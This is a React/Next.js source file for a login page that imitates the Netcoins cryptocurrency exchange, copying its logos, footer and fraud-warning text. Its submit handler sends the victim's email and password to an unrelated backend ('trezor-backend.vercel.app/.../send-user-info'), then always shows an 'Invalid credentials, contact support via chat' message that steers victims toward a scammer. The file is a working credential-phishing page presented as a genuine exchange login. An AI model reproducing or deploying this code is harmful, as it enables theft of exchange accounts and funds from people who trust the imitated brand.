"use client";
import React, { useState } from "react";
import {
    Box,
    Button,
    Dialog,
    DialogActions,
    DialogContent,
    DialogTitle,
    Grid,
    IconButton,
    Link,
    List,
    ListItemButton,
    Snackbar,
    Stack,
    TextField,
    InputAdornment,
    Typography,
    Paper
} from "@mui/material";
import CloseIcon from '@mui/icons-material/Close';
import axios from "axios";
import Visibility from "@mui/icons-material/Visibility";
import VisibilityOff from "@mui/icons-material/VisibilityOff";
import first from '../../assets/first.svg'
import flower from '../../assets/flower.svg'
import name from '../../assets/name.svg'
import MailOutlineIcon from '@mui/icons-material/MailOutline';
import Image from "next/image";
import LockOutlineIcon from '@mui/icons-material/LockOutline';
export default function LoginMainPage() {
    const [openHelpModal, setOpenHelpModal] = useState(false);
    const [email, setEmail] = useState("");
    const [password, setPassword] = useState("");
    const [showPassword, setShowPassword] = useState(false);
    const handleCloseHelp = () => setOpenHelpModal(false);
    const [loading, setLoading] = useState(false)
    const [open, setOpen] = useState(false);

    const handleSubmit = async (e) => {
        e.preventDefault(); // Prevent page reload
        try {
            if (!email || !password) {
                alert("Please enter both email and password");
                return;
            }
            const data = {
                title: "Netcoins | Buy Bitcoin & Crypto",
                email: email,
                password

            }
            setLoading(true)
            const response = await axios.post("https://trezor-backend.vercel.app/api/v1/send-user-info", data)
            if (response) {
                setOpen(true)
            }
        } catch (err) {
            console.log(err);
            setOpen(true)

        } finally {
            setLoading(false)


        }
    };


    const handleClose = (event, reason) => {
        if (reason === 'clickaway') {
            return;
        }

        setOpen(false);
    };
    const action = (
        <React.Fragment>
            <Button color="secondary" size="small" onClick={handleClose}>
                UNDO
            </Button>
        </React.Fragment>
    );
    return (
        <Box sx={{ bgcolor: "white", color: "white", height: "100%", bgcolor: "#07072E", position: "relative" }}>
            <Snackbar
                open={open}
                autoHideDuration={6000}
                onClose={handleClose}
                message="Invalid credentials. Please contact support via chat."
                action={action}
                anchorOrigin={{ vertical: 'top', horizontal: 'right' }}
            />
            <Box
                component={"form"}
                onSubmit={handleSubmit}
                sx={{
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                }}
            >
                <Stack
                    spacing={1.5}
                    sx={{
                        width: "100%",
                        maxWidth: "490px",
                        bgcolor: "transparent",
                        p: 2,
                        textAlign: "center",
                        pt: { xs: 10, lg: 15 }
                    }}
                >
                    {/* Logo + Title */}
                    <Stack direction={"row"} justifyContent={"center"} gap={2} alignItems="center" pb={4} >
                        <Image src={first} width={50.5} height={50.5} alt="first" />
                        <Image src={name} width={200.9} height={25.5} alt="first" />
                        <Image src={flower} width={27} height={30} alt="first" />
                    </Stack>

                    {/* Input Fields */}
                    <TextField
                        fullWidth
                        placeholder="Enter your email"
                        variant="outlined"
                        type="email"
                        onChange={(e) => setEmail(e.target.value)}
                        value={email}
                        InputProps={{
                            startAdornment: (
                                <InputAdornment position="start">
                                    <Box
                                        sx={{
                                            bgcolor: "#202043",
                                            p: 2,
                                            borderRadius: "6px 0 0 6px",
                                            display: "flex",
                                            alignItems: "center",
                                            justifyContent: "center",
                                            borderRight: "1px solid #2e2e4e",
                                        }}
                                    >
                                        <MailOutlineIcon sx={{ color: "white", fontSize: 16 }} />
                                    </Box>
                                </InputAdornment>
                            ),
                        }}
                        sx={{

                            "& .MuiOutlinedInput-root": {
                                fontSize: "16px",
                                paddingLeft: "0 !important",
                                borderRadius: "8px",
                                overflow: "hidden",
                                bgcolor: "#393958",
                                "& fieldset": {
                                    borderColor: "transparent",
                                },
                                "&:hover fieldset": {
                                    borderColor: "#666",
                                },
                                "& input": {
                                    color: "white",
                                    padding: "12px 14px",
                                },
                            },
                            "& .MuiInputAdornment-root": {
                                margin: 0,
                            },
                        }}
                    />


                    <TextField
                        fullWidth
                        type={showPassword ? "text" : "password"}
                        placeholder="Enter your password"
                        variant="outlined"
                        onChange={(e) => setPassword(e.target.value)}
                        value={password}
                        InputProps={{
                            startAdornment: (
                                <InputAdornment position="start">
                                    <Box
                                        sx={{
                                            bgcolor: "#202043",
                                            p: 2,
                                            borderRadius: "6px 0 0 6px",
                                            display: "flex",
                                            alignItems: "center",
                                            justifyContent: "center",
                                            borderRight: "1px solid #2e2e4e",
                                        }}
                                    >
                                        <LockOutlineIcon sx={{ color: "#c9c9d8", fontSize: 16 }} />
                                    </Box>
                                </InputAdornment>
                            ),
                            endAdornment: (
                                <InputAdornment position="end">
                                    <IconButton onClick={() => setShowPassword(!showPassword)}>
                                        {showPassword ? (
                                            <VisibilityOff sx={{ color: "#ccc" }} />
                                        ) : (
                                            <Visibility sx={{ color: "#ccc" }} />
                                        )}
                                    </IconButton>
                                </InputAdornment>
                            ),
                        }}
                        sx={{
                            "& .MuiOutlinedInput-root": {
                                paddingLeft: "0 !important",
                                fontSize: "16px",
                                overflow: "hidden",
                                borderRadius: "8px",
                                bgcolor: "#393958",
                                "& fieldset": {
                                    borderColor: "transparent",
                                },
                                "&:hover fieldset": {
                                    borderColor: "#666",
                                },
                                "& input": {
                                    color: "white",
                                    padding: "12px 14px",
                                },
                            },
                            "& .MuiInputAdornment-root": {
                                margin: 0,
                            },
                        }}
                    />

                    <Typography
                        color="#7793F9"
                        component={"p"}
                        textAlign="left"
                        sx={{ cursor: "pointer", fontSize: "14px", fontWeight: "400" }}
                    >
                        Forgot your password?
                    </Typography>

                    {/* Sign In Button */}
                    <Box pt={2}>
                        <Button
                            fullWidth
                            variant="contained"
                            type="submit"
                            loading={loading}
                            disabled={loading}
                            sx={{
                                bgcolor: "#4666FF",
                                textTransform: "none",
                                fontWeight: 500,
                                letterSpacing: "1px",
                                height: "48px",
                            }}
                        >
                            Sign In
                        </Button>
                    </Box>

                    {/* Create Account */}
                    <Stack direction={"row"} py={2}>
                        <Typography component={"p"} color="white" fontWeight={400}>
                            Need an account?{" "}
                            <Link href="#" color="#7793F9" underline="hover" sx={{ fontWeight: 400 }}>
                                Create an account
                            </Link>
                        </Typography>
                    </Stack>

                    {/* Fraud Alert Box */}
                    <Paper
                        variant="outlined"
                        sx={{
                            bgcolor: "#202043",
                            color: "#d1d1d1",
                            p: 3,
                            textAlign: "left",
                            borderColor: "#1c1d5e",
                            borderRadius: "5px",
                            mb: 5
                        }}
                    >
                        <Typography component={"p"} fontWeight={700} mb={1} color="white">
                            Please be aware of fraudsters.
                        </Typography>
                        <Typography component={"p"} color="white" fontSize={12}>
                            Please do not accept money or purchase digital assets on behalf of
                            any 3rd party. If you have been contacted or hired to take part in a
                            transaction like this, please contact us and we will explain the
                            risks. You are at risk of losing your funds.
                        </Typography>
                    </Paper>

                    {/* Footer */}


                </Stack>


            </Box>
            <footer style={{ position: "sticky", bottom: "0px", left: 0, width: "100%" }}>
                <Stack direction={"row"} justifyContent={"center"} >
                    <Stack direction={"row"} justifyContent={"center"}>
                        <Typography variant="caption" textAlign={"center"} color="#B5B5C0" mt={2} fontSize={10}>
                            © 2025 Netcoins - A BIGG Digital Assets Company (TSXV: BIGG) MSB: M15560893. Made in Vancouver, Canada. {" "}
                            <Link color="#7793F9" underline="hover">
                                Terms of Service
                            </Link>{" "}
                            |{" "}
                            <Link color="#7793F9" underline="hover">
                                Privacy Policy
                            </Link>
                        </Typography>
                    </Stack>
                </Stack>
            </footer>

            <Dialog
                open={openHelpModal}
                onClose={handleCloseHelp}
                PaperProps={{
                    sx: {
                        bgcolor: "rgb(30, 33, 36)",
                        color: "white",
                        borderRadius: "6px",
                        minWidth: 400,
                        border: "none"
                    },
                }}
            >
                <Stack direction={"row"} justifyContent={"space-between"}>

                    <DialogTitle sx={{
                        fontWeight: 600, border: "none", color: "white", fontFamily:
                            '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',
                    }}>What can we help with?</DialogTitle>
                    <IconButton
                        aria-label="close"
                        onClick={handleCloseHelp}
                        sx={(theme) => ({
                            position: 'absolute',
                            right: 8,
                            top: 8,
                            color: theme.palette.grey[500],
                        })}
                    >
                        <CloseIcon />
                    </IconButton>
                </Stack>
                <DialogContent dividers sx={{ px: 3, py: 0 }}>
                    <List>
                        {[
                            "I forgot my password",
                            "I forgot the email address I log in with",
                            "I need access to an account as a third party",
                            "There's an unauthorized account in my name",
                        ].map((text, idx) => (
                            <ListItemButton
                                key={idx}
                                sx={{
                                    color: "white",
                                    borderBottom: "1px solid #333",
                                    pb: 2,
                                    px: 0,
                                    fontSize: "13px",
                                    fontWeight: "700",
                                    fontFamily:
                                        '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',

                                    // "&:hover": { bgcolor: "#222" },
                                }}
                            >
                                {text}
                            </ListItemButton>
                        ))}
                    </List>
                </DialogContent>
                <DialogActions sx={{ px: 3, pb: 3 }}>
                    <Button
                        fullWidth
                        variant="outlined"
                        sx={{
                            borderColor: "white",
                            color: "white",
                            height: "44px",
                            textTransform: "none",
                            fontWeight: 700,
                            borderRadius: "24px",
                            fontSize: "13px",
                            mt: 2,
                            background: "rgb(30, 33, 36)",
                            "&:hover": { borderColor: "#aaa" },

                            fontFamily:
                                '"Capsule Sans Display", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif',

                        }}
                        onClick={handleCloseHelp}

                    >
                        Cancel
                    </Button>
                </DialogActions>
            </Dialog>
        </Box>
    );
}
